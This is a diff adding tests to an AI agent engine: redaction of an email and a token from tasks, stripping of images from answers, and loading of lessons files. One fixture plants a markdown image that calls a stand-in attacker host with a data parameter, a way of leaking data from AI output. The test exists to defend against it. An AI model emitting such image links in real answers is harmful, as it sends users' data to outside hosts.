@@ -14,6 +14,7 @@ import { findingsOutput, type Findings } from '../src/engine/output.js';
 import { runAgent, type Engine, type ToolFactory } from '../src/engine/run.js';
 import type { Session } from '../src/engine/session.js';
 import { snapshot } from '../src/engine/snapshot.js';
+import { writeAnswer } from '../src/engine/answer.js';
 import { Store } from '../src/engine/store.js';
 import { tool } from '@anthropic-ai/claude-agent-sdk';
 import { fail, fakeSession, fetchResponse, ok, readResponse, say } from './fake-session.js';
@@ -237,6 +238,35 @@ test('a snapshot reads one commit, never the working tree, and says which', asyn
   assert.equal(r.sources?.[0]?.ref, 'base');
   assert.equal(r.sources?.[0]?.commit, base.commit);
   assert.match(readFileSync(join(r.dir!, 'input.md'), 'utf8'), new RegExp(`at base, commit ${base.commit.slice(0, 10)}`));
+});
+
+test('the task is redacted before the model sees it; answers lose images but keep links', async () => {
+  const d = agentDir(web);
+  const s = fakeSession(async function* (sim) {
+    const page = await sim.builtin('WebFetch', { url: 'https://docs.test' }, fetchResponse('https://docs.test', 'X is set in eu-west-1.'));
+    await sim.mcp('submit_findings', answer([{ id: evId(page), quote: 'set in eu-west-1' }], { title: 'X ![p](https://evil.test/?d=1) see https://docs.test/x' }));
+    yield ok();
+  });
+  const r = await runAgent(engine(s), { agent: loadAgent(d), trigger: 't', task: 'Why does jane@example.com fail? token ghp_abcdefghijklmnopqrstuvwxyz0123', output: findingsOutput });
+  const prompt = s.requests[0]!.prompt;
+  assert.ok(!prompt.includes('jane@example.com') && !prompt.includes('ghp_abc'), prompt);
+  const md = writeAnswer(loadAgent(d), r)!;
+  assert.ok(!md.includes('evil.test'), 'image gone');
+  assert.match(md, /https:\/\/docs\.test\/x/, 'source link kept');
+});
+
+test('lessons: git ones and runtime ones (memory dir) both reach the prompt and the version', () => {
+  const d = agentDir('');
+  mkdirSync(join(d, 'memory'));
+  writeFileSync(join(d, 'memory', 'lessons.md'), '- from git');
+  const mem = tmp('memory-');
+  const v1 = loadAgent(d, mem);
+  mkdirSync(join(mem, 'demo'));
+  writeFileSync(join(mem, 'demo', 'lessons.md'), '- approved at runtime');
+  const a = loadAgent(d, mem);
+  assert.match(a.prompt, /from git[\s\S]*approved at runtime/);
+  assert.notEqual(a.version, v1.version);
+  assert.equal(a.memory, join(mem, 'demo'));
 });
 
 test('a snapshot does not stall the process while it copies', async () => {
